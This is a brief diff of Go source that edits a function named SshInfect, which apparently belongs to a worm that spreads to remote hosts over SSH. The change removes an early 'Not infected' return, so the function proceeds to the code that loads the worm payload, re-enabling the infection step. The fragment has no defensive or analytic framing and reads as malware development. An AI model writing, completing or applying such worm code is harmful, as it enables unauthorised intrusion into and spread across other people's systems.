@@ -149,7 +149,6 @@ func SshInfect(ip string, filename string) string {
 	}
 	if session != nil {
 		defer session.Close()
-		return "Not infected"
 	}
 
 	var worm []byte
